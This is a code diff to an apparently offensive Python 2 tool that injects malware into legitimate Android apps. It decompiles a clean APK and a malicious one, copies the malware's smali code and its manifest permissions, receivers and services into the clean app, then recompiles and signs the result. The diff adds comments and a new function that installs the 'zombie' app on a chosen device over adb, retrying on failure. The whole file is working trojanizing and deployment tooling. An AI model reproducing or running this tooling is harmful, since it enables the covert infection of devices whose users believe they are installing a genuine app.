@@ -17,7 +17,7 @@ def displayAPKs(dirPath):                                               #display
     print ""
 
 
-def decompile(freshAPK, malAPK):
+def decompile(freshAPK, malAPK):                                        #decompile freshAPK file and malicious apk file
     freshAPKDec = "../temp/freshAPKDec"
     malAPKDec = "../temp/malAPKDec"
     
@@ -43,15 +43,14 @@ def decompile(freshAPK, malAPK):
 
 def injectMalware(freshAPK, malAPK):
     [freshAPKDec, malAPKDec] = decompile(freshAPK, malAPK)                     # decompile fresh .apk file and malicious .apk files into temp folder
-    injectFiles(freshAPKDec, malAPKDec)
-    updateManifest(freshAPKDec+"/AndroidManifest.xml", malAPKDec+"/AndroidManifest.xml")  
-    
+    injectFiles(freshAPKDec, malAPKDec)                                         #inject malicious code into the fresh apk
+    updateManifest(freshAPKDec+"/AndroidManifest.xml", malAPKDec+"/AndroidManifest.xml")  # update permissions, services, receivers in new original AndroidManifest.xml file   
     return freshAPKDec
 
 def injectFiles(freshAPKDec, malAPKDec):
-    print "[!] Injecting files into original app..."
+    print "[!] Injecting files into original app..."    
     
-    for item in os.listdir(malAPKDec+"/smali/com/"):
+    for item in os.listdir(malAPKDec+"/smali/com/"):                        #copy every packages inside malware file into original app
         if(os.path.isdir(malAPKDec+"/smali/com/"+item)):
             shutil.copytree(malAPKDec+"/smali/com/"+item, freshAPKDec+"/smali/com/"+item)
     
@@ -60,7 +59,7 @@ def injectFiles(freshAPKDec, malAPKDec):
 def updateManifest(freshManifest, malManifest):
     
     print "[!] Injecting Permissions..."   
-    freshMan = open(freshManifest, "r")
+    freshMan = open(freshManifest, "r")                                 #open manifests for injection
     malMan = open(malManifest, "r")
     freshLines = freshMan.readlines()
     malLines = malMan.readlines()
@@ -82,24 +81,19 @@ def updateManifest(freshManifest, malManifest):
             fcount+=1
     
     print "[+] Permissions injected!"
-    fcount = len(freshLines)
-    
-    #print freshLines
-    
+    fcount = len(freshLines)                    #get the android manifest length
+
     print "[!] Injecting receiver and services..."
     
     receiverStart = 0
     receiverEnd = 0
     
     for i, fLine in enumerate(freshLines):
-        if "<activity" in fLine:
+        if "<activity" in fLine:                        #find the start of <activity tag inside the original file's manifest
             activityIndex.append(i)
-            
-    #print activityIndex
-    
-    for k, mLine in enumerate(malLines):
+
+    for k, mLine in enumerate(malLines):                    #find any receiver entries inside the original file's manifest file
         receiverExists = False       
-        #print mLine
         if "<receiver" in mLine:
             receiverStart = k
         if "</receiver>" in mLine:
@@ -108,8 +102,7 @@ def updateManifest(freshManifest, malManifest):
                 
         if receiverExists:
             for lineNo in range(receiverEnd, receiverStart-1, -1):
-                #print "++++++++++++++++++"+malLines[lineNo]
-                freshLines.append("0")
+                freshLines.append("0")                              #add new line to extend the size of the manifest file
                 for j in range(fcount-1, activityIndex[0]-1,-1):
                     freshLines[j+1] = freshLines[j]
                 freshLines[activityIndex[0]] = malLines[lineNo]
@@ -125,16 +118,15 @@ def updateManifest(freshManifest, malManifest):
     
     print "[!] Permissions injected into fresh AndroidManifest.xml. Closing manifests.."
     
-    malMan.close() 
-    
-    #os.system("subl "+freshManifest)
+    malMan.close()          #close AndroidManifest.xml file of Malware apk
+
     print "[+] Done!"
 
 def recompile(decDir):
     print "[!] Recompiling decompiled app in %s..."%decDir
     os.chdir("../tools")
     print os.getcwd()
-    subprocess.call(["./apktool","b","-f",decDir,decDir.replace("Dec","_recom.apk")])
+    os.system("./apktool b -f %s %s"%(decDir, decDir.replace("Dec","_recom.apk")))      #recompile the infected apk file
     print "[+] Zombie app("+decDir.replace("Dec","_recom.apk")+") created in the temp folder !"
     os.chdir("../injector")
     return decDir.replace("Dec","_recom.apk")
@@ -142,31 +134,63 @@ def recompile(decDir):
 def signApp(compiledApp):
     print "[!] Signing the compiled app..."
     os.chdir("../tools")
-    os.system("java -jar ../tools/signapk.jar testkey.x509.pem testkey.pk8 %s %s"%(compiledApp, compiledApp.replace(".apk","_signed.apk")))
+    os.system("java -jar ../tools/signapk.jar testkey.x509.pem testkey.pk8 %s %s"%(compiledApp, compiledApp.replace(".apk","_signed.apk")))  #sign the recompiled apk file
     print "[+] Zombie app signed ! Saved as "+ compiledApp.replace(".apk","_signed.apk")
     os.chdir("../injector")
+    return compiledApp.replace(".apk","_signed.apk")
+    
+def installMalware(zombieAPK):
+    option = raw_input("\n[+] Malware is ready to upload on a device. Proceed with uploading? (y/n) : ")
+    success = False
+    
+    if option.lower()=="y":
+        os.chdir("../tools")
+        print "----------------------------------------------\n"
+        os.system("./adb devices")                      # display available devices
+        print "----------------------------------------------"
+        deviceName = raw_input("Enter device name : ")
+    
+        while not success:          #try to upload file again and again in case of failures
+            print "[+] Installing "+zombieAPK+" ..."
+            output = subprocess.check_output(['./adb','-s',deviceName,'install',zombieAPK])     #upload and install the zombie file
+            if "failure" in output.lower():     #check whether there are errors in uploading and installation
+                print output
+                retry = raw_input("[x] Failed to upload and install package. Retry? (y/n) : ")
+                if retry.lower() == "y":
+                    continue
+                else:
+                    print "[x] Zombie wasn't installed on "+deviceName+"!"
+                    break
+            else:
+                print output
+                success = True
+                print "[+] Zombie successfully installed on "+deviceName+" !"
+                
+        os.chdir("../injector")
+
 
 def cleanTemp():
     option = (raw_input("\nDo you want to clean up temp directory ? (y/n) : ")).lower()
     if option == 'y':
-        os.system("rm -R ../temp/*")
+        os.system("rm -R ../temp/*")        #clean all files inside the Temp folder
         print "[+] temp files cleaned up!"
 
 
 def checkDirExists(dirPath):
-    if os.path.isdir(dirPath):
+    if os.path.isdir(dirPath):   #check whether temp folder exists - when this framework is run for the first time, temp folder have to be created. it does not exist by default
         print "[!] %s directory already exists! Skipping folder creation.."%os.path.abspath(dirPath)
         return True
     else:
         print "[!] Creating %s directory..."%os.path.abspath(dirPath)
-        os.mkdir(dirPath)
+        os.mkdir(dirPath)  #create temp directory
         return False
 
-def openTempDir():
+def openTempDir():      #open temp directory to view files inside it
     option = raw_input("Do you want to open temp folder ? (y/n) : ")
     if option.lower() == "y":
         if os.path.isdir("../temp"):
-            os.system("nautilus ../temp")
+            os.system("nautilus ../temp")   #open temp directory in nautilus(ubuntu)
+            option = raw_input("Press any key to continue...")
             
 
 def main():
@@ -181,12 +205,13 @@ def main():
     if checkDirExists("../temp"):                   #check whether temperory folder exists, otherwise create it. this folder includes decompiled apks
         cleanTemp()        
     
-    zombieAppDir = injectMalware(freshAPK, payloadAPK)
+    zombieAppDir = injectMalware(freshAPK, payloadAPK)  #inject malware files into original file
     
-    zombieAppName = recompile(zombieAppDir)
+    zombieAppName = recompile(zombieAppDir)  #recompile the infected file
     
-    signApp(zombieAppName)
-    openTempDir()
+    zombieSignedAppName = signApp(zombieAppName)  #sign the zombie file
+    openTempDir()   #open temp directory
+    installMalware(zombieSignedAppName)  #install malware on the device
     print "[+] Module script completed!"
     print "All Done!"
     
